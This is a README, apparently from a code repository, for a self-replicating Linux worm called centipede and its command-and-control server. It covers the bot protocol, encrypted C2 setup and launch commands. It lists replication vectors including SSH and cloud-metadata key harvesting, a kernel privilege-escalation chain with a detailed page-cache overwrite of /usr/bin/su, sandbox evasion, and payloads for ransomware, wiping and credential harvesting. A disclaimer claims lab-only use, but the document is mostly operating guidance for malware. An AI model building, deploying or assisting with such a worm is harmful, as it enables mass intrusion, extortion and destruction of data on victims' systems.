# centipede

Self-replicating Linux worm with a browser-based command and control
server. Two binaries ship together:

- **centipede** - the worm itself: environment fingerprinting, network
  scanning, multi-vector self-replication, kernel LPE attempts, payload
  suite, persistence and layered C2 channels (WebSocket / DNS / ICMP /
  Discord).
- **c2d** - the C2 server: WebSocket bot channel with a browser dashboard,
  REST API, optional operator auth, Discord notifications, and cloudflared
  quick-tunnel support.

**DISCLAIMER:** For authorized security testing and educational purposes
only. Use only on systems you own or have written permission to test.

---

# c2d - C2 server

WebSocket-based command and control server with a browser dashboard, REST
API, optional operator authentication, Discord result notifications, and
built-in cloudflared quick-tunnel support. Ships as a single self-contained
binary with the web assets embedded.

**DISCLAIMER:** For authorized security testing and educational purposes
only. Use only on systems you own or have written permission to test.

## Features

- **Bot channel** - worm instances connect over WebSocket (`/ws/bot`) and receive
  tasks in real time. Queued tasks are flushed automatically when a bot
  reconnects and pings.
- **Operator dashboard** - dark-themed single-page UI: live stats, bot grid
  with tagging, command history, quick-command presets, live activity feed
  pushed over the operator WebSocket.
- **REST API** - `/api/bots`, `/api/commands`, `/api/stats`,
  `/api/command` for targeting single bots, tags, or broadcast.
- **Operator auth (optional)** - `-token` gates the API and operator
  WebSocket; the dashboard logs in via `/login?token=...` (HttpOnly cookie).
- **TLS** - terminate at the server (`-cert`/`-key`) or in front (Caddy,
  nginx - see `deploy/nginx.conf`).
- **Transports** - `-tunnel cloudflared` spawns a quick tunnel and prints
  the public URL; CDN-fronting worker included (`deploy/cloudflare_worker.js`);
  details in `docs/TRANSPORTS.md`.
- **Discord notifications** - result messages forwarded to a channel when a
  bot token + channel ID are provided.

## Quickstart

```bash
make build                     # builds bin/c2d and bin/centipede
./bin/c2d -addr :8443 -token "op-secret"
```

Then open `http://localhost:8443/`, log in with the token, and point bots at
`ws://<host>:8443/ws/bot` (or `wss://` behind TLS).

```bash
make test                       # run the test suite
make run-c2d                    # build + run c2d on :8443
make run-worm                   # build + run the worm against ws://127.0.0.1:8443
```

Test suite coverage (`go test ./...`): dashboard and static asset serving,
API command queueing, operator token gate and cookie login, full bot
WebSocket lifecycle (register, task delivery, result, completion), operator
event broadcast, offline-queue flush on reconnect, and worm-to-server
interop (the real worm C2 client registers with c2d, receives a queued
task and reports its result end to end).

## Flags

| Flag | Default | Purpose |
|------|---------|---------|
| `-addr` | `:8443` | Listen address |
| `-token` | (empty) | Require this operator token on `/api` and `/ws` |
| `-cert`, `-key` | (empty) | Serve TLS with the given certificate |
| `-tunnel` | `none` | `cloudflared` spawns a quick tunnel |
| `-bot-key` | (empty) | Static X25519 private key (hex) - enables the encrypted bot channel |
| `-bot-secret` | (empty) | Operator secret (hex) each worm must prove to register |
| `-bot-key-gen` | (off) | Generate a bot-channel keypair and exit |
| `-discord-token`, `-discord-channel` | (empty) | Discord result notifications |

## Layout

```
main.go                    c2d: C2 server daemon (single binary, assets embedded)
main_test.go               c2d end-to-end tests (REST, auth, WebSocket lifecycle)
cmd/centipede/main.go      worm entry point
internal/
  sensor/                  environment fingerprinting + sandbox detection
  scanner/                 network discovery
  replicator/              multi-vector self-propagation
  exploiter/               kernel LPE attempts + exploit chain
  payloads/                post-exploitation payload suite
  c2/                      layered C2 client (WebSocket / DNS / ICMP / Discord)
  common/                  crypto + system utilities
web/
  templates/index.html     operator dashboard
  static/css/dark.css      dashboard theme
  static/js/app.js         dashboard logic
docs/TRANSPORTS.md         tunnel / fronting / direct-TLS options
deploy/
  cloudflare_worker.js     CDN fronting worker (host-routing + decoy)
  nginx.conf               TLS + WebSocket reverse proxy sample
Makefile                   build / test / vet / run targets
```

## Bot protocol (`/ws/bot`)

The worm sends JSON frames:

```json
{"t":"register","bid":"<id>","hostname":"h","ip":"1.2.3.4",
 "os":"linux","arch":"amd64","kernel":"6.1.0","privilege":"root","layer":1}
{"t":"ping"}
{"t":"result","bid":"<id>","tid":"<task id>","ok":true,"out":"..."}
```

Server sends:

```json
{"t":"task","id":"<task id>","act":"exec","args":"id"}
{"t":"pong"}
```

Task actions are free-form strings (`exec`, `enum`, `payload`, ...) whose
semantics belong to the worm implementation. Tasks are queued while a bot
is offline and delivered on the next ping.

Task `args` are normalized by the worm: a bare command string (`id`), a
JSON object (`{"cmd":"id"}`), or a JSON object encoded inside a string
(`"{\"cmd\":\"id\"}"`) all resolve to the same command map, so exec-style
tasks behave identically regardless of how the operator client encodes them
(covered by `TestParseTaskArgs`).

## Encrypted bot channel

When c2d runs with `-bot-key`, the bot WebSocket channel is end-to-end
encrypted:

- **Handshake** - the worm sends an ephemeral X25519 public key; both
  sides derive the shared secret against the server's static key. The server
  answers with an AEAD-sealed ack, so the worm authenticates the server
  before sending anything else. With `-bot-secret` set, the worm must also
  prove knowledge of the operator secret (HMAC tag in the hello) - fleet
  membership check.
- **Every frame after the handshake** is AES-256-GCM sealed with per-direction
  HKDF subkeys and monotonic sequence numbers (anti-replay). Task delivery,
  pings, results and registration all ride inside the envelope.
- **Plaintext mode** remains only when `-bot-key` is not set.

Setup:

```bash
./bin/c2d -bot-key-gen          # prints private + public hex
./bin/c2d -addr :8443 -token "op" -bot-key <private-hex> -bot-secret <secret-hex>
```

Give the PUBLIC hex and the secret to each worm:

```bash
./bin/centipede -c2 wss://<c2>/ws/bot -c2-key <public-hex> -c2-secret <secret-hex> \
    -no-spread -no-exploit -debug
```

(or set `c2_key` / `c2_secret` in the config file). Worms without the
matching key cannot decrypt the ack; worms without the secret are rejected
at the handshake. Covered by `TestEncryptedWormE2E`,
`TestEncryptedHandshakeRejectsBadSecret` and
`TestEncryptedChannelRejectsPlaintext`.

## Operator channel (`/ws`)

The dashboard listens here for live events:

```json
{"t":"hello","bots":3}
{"t":"bot_register","bid":"...","hostname":"..."}
{"t":"bot_result","bid":"...","out":"..."}
{"t":"bot_gone","bid":"..."}
```

## REST API

| Method | Path | Purpose |
|--------|------|---------|
| GET | `/api/bots` | List bots |
| GET | `/api/bots/{id}` | Bot detail |
| POST | `/api/bots/{id}/tag` | Set bot tag (`{"tag":"..."}`) |
| POST | `/api/command` | Queue a command (`bot_id` \| `tag` \| empty = broadcast) |
| GET | `/api/commands` | Command history |
| GET | `/api/stats` | Totals + server state |

With `-token` set, requests must carry the token via the `X-C2-Token` header,
the `c2_token` cookie (set by `/login?token=...`), or the `token` query
parameter.

---

# centipede - the worm

The worm connects to c2d over WebSocket (or falls back through its layered
channels), fingerprints the host, and runs: network scanning, replication
across the vectors it can reach, kernel LPE attempts when not root, and the
payload suite on operator command.

```bash
make build-worm
./bin/centipede -c2 wss://your-c2.example/ws/bot -debug
./bin/centipede -c2 wss://your-c2.example/ws/bot -c2-key <pub> -c2-secret <secret>  # encrypted channel
./bin/centipede -c2 ws://127.0.0.1:8443/ws/bot -no-spread   # disable replication
./bin/centipede -c2 ws://127.0.0.1:8443/ws/bot -no-exploit  # disable LPE
```

Configuration file (default `/etc/centipede.conf`, JSON):

```json
{
  "c2_endpoint": "wss://your-c2.example/ws/bot",
  "c2_key": "",
  "c2_secret": "",
  "c2_dns_domain": "",
  "c2_discord_token": "",
  "c2_discord_channel": "",
  "c2_icmp_target": "",
  "scan_interval": 300,
  "spread_interval": 300,
  "exploit": true,
  "replication": true,
  "masquerade": true
}
```

## Behavior

- **Fingerprinting** - `internal/sensor` gathers host context and performs
  sandbox checks; in a sandboxed environment the worm idles instead of
  acting.
- **C2 channels** - `internal/c2` implements the WebSocket channel plus DNS,
  ICMP, and Discord fallback layers. The matching c2d endpoint is the
  WebSocket channel; DNS/ICMP/Discord layers target operator-provided
  infrastructure (see `docs/TRANSPORTS.md` for transport setup).
- **Replication** - `internal/replicator` spreads over the vectors it can
  reach: SSH (Go-native via x/crypto/ssh - no ssh/sshpass binaries needed on
  the target; private-key and password auth), cloud metadata key spray
  (AWS/Azure/GCP IMDS user-data key harvesting + provider default users),
  SMB, HTTP PUT, FTP, WiFi, USB and CVE-based routes.
- **LPE chain** - `internal/exploiter` fingerprints kernel/arch, runs a
  prioritized exploit chain (Fragnesia, Copy-Fail, Dirty Pipe, PwnKit,
  overlayfs variants) and re-executes as root when one succeeds.
  Page-cache exploits provision the worm binary setuid-root
  (`elev_path`) so the re-exec lands with euid 0.
- **Payloads** - `internal/payloads` implements the operator-selectable
  actions: `exec`, `enum`, `harvest`, `persist`, `pivot`, `ransomware`,
  `ransomware_decrypt`, `wipe`, `selfdestruct`.

## Task actions

The dashboard/API queue `action` + `args` frames; the worm handles them
in `cmd/centipede/main.go` (`processTasks`). Actions the worm knows:
`exec`/`shell`, `payload`, `enum`, `harvest`, `persist`, `pivot`,
`ransomware`, `ransomware_decrypt`, `wipe`, `selfdestruct`, `sleep`,
`spread` (operator-directed propagation: args `target`, `vector` [ssh-key |
ssh-pass], optional `user`/`pass`). Unknown actions are executed through the
shell.

## Notes

- The worm's C2 client speaks the c2d wire protocol directly (flat
  register / task / result frames) and is verified end to end by the interop
  test - registration, task delivery and result reporting are covered.
- Copy-Fail runs the embedded Python payload and requires `python3` on the
  target. The Fragnesia method compiles its embedded C payload on the target
  with `gcc` (static preferred); when no compiler is present it falls back
  to a prebuilt companion binary (`fragnesia_exploit`) placed next to the
  worm or in the system temp dir.
- `spread` task actions work even when autonomous replication is disabled
  (`-no-spread`): the payload is staged on demand for directed drops.
- The worm is self-replicating by design. Run it only in isolated labs
  and networks you are authorized to test.
- c2d and the worm are separate binaries: `bin/c2d` and `bin/centipede`.

## Exploit chain

`internal/exploiter` fingerprints the kernel, picks applicable candidates,
and runs them in order until root is obtained.  Failures are non-fatal and
the chain continues.  Page-cache candidates provision the worm binary
setuid-root (`elev_path`) so the re-exec lands with euid 0.

Payloads are compiled on the target from embedded sources (gcc, static
preferred) or executed directly (Copy-Fail ships as an embedded Python
payload; GameOverlay/OverlayFS as an embedded shell payload).  Kernel
payloads are wired to the target architecture: Dirty Frag ships x86_64 and
aarch64 builds, Dirty Pipe and Fragnesia are x86_64, PwnKit is portable.

| Order | Candidate | CVE | Kernel range / condition |
|-------|-----------|-----|--------------------------|
| 1 | Dirty Frag | CVE-2026-43284/CVE-2026-43500 | 4.x - 6.x, xfrm-ESP + RxRPC chain (x86_64 + aarch64) |
| 2 | Fragnesia | CVE-2026-46300 | 4.x - 6.x before the 2026-05-13 patch, x86_64, userns + ESP-in-TCP |
| 3 | Copy-Fail | CVE-2026-31431 | 5.x - 6.x with AF_ALG/algif_aead |
| 4 | Dirty Pipe | CVE-2022-0847 | 5.8 - 5.16 |
| 5 | PwnKit | CVE-2021-4034 | any kernel with pkexec |
| 6 | GameOverlay | CVE-2023-3269 | Ubuntu 5.x+ with overlayfs |
| 7 | OverlayFS | CVE-2023-2640 | Ubuntu 5.x+ with overlayfs |

## Fragnesia payload (CVE-2026-46300)

Fragnesia is a Linux kernel local privilege escalation in the XFRM
ESP-in-TCP subsystem. A logic flaw in `skb_try_coalesce()` drops the
SKBFL_SHARED_FRAG marker during socket buffer coalescing, so ESP-in-TCP
decryption runs in place over page-cache-backed file pages that were spliced
into the TCP receive queue. The AES-GCM keystream byte at counter block 2,
byte 0 is XORed directly into the cached file page: a deterministic,
race-free one-byte-per-trigger page-cache write.

The chain candidate (`fragnesia`) runs on x86_64 kernels from 4.x up to the
May 2026 patch. It writes a 192-byte elevation stub over the first bytes of
`/usr/bin/su` in the page cache (the on-disk file is never touched), then
feeds the resulting root shell a hook that provisions the worm binary
setuid-root and drops the page cache. The worm re-execs itself with euid
0 and clears the setuid bit. The payload is self-contained (vendored UAPI,
no kernel headers needed) and requires:

- x86_64 Linux with ESP-in-TCP / XFRM (before the 2026-05-13 patch)
- unprivileged user namespaces allowed (AppArmor
  `apparmor_restrict_unprivileged_userns=1` or
  `unprivileged_userns_clone=0` are reported and skipped)
- a setuid-root target of at least ~4.3 KB (`/usr/bin/su` or `/bin/su`)
- `gcc` on the target, or a prebuilt companion payload

Prebuild the optional companion payload (for hosts without a compiler) and
drop it on the target as `fragnesia_exploit` next to the worm or in the
system temp dir:

```bash
make payload-fragnesia          # builds internal/exploiter/companion/
```

Payload source: `internal/exploiter/native/fragnesia_exploit.c`.
Research: V12 Security / William Bowling (Zellic);
`lists.openwall.net/netdev/2026/05/13/79`.

Verification status: the payload compiles with native headers, with the
vendored UAPI fallback (no kernel headers), and with the aarch64 cross
toolchain; `go vet` and the full test suite pass (`TestParseTaskArgs`, the
exploiter gate/elevation tests, c2d REST/auth/bot E2E, encrypted worm E2E,
and worm<->server interop). In this sandbox the payload runs to a clean
gate-closed exit (NETLINK_XFRM unavailable in the container) and leaves the
target binary untouched. A live root shell has not been demonstrated here:
the sandbox kernel is past the 2026-05-13 patch, so the full write-and-elevate
path still needs validation on a vulnerable pre-patch kernel in the lab.

## Security notes

- `-token` protects the operator surfaces. The bot channel is end-to-end
  encrypted when `-bot-key` is configured; without it the channel is
  plaintext, so production deployments must set `-bot-key` (and ideally
  `-bot-secret`) and run under TLS (`wss://`) or a front proxy.
- Do not expose an unauthenticated server to the open internet - put it
  behind TLS plus `-token` and restrict access with firewall rules.


<img width="1536" height="1024" alt="worm2" src="https://github.com/user-attachments/assets/b6dd6bf8-0ffa-4048-959a-08878a160b67" />

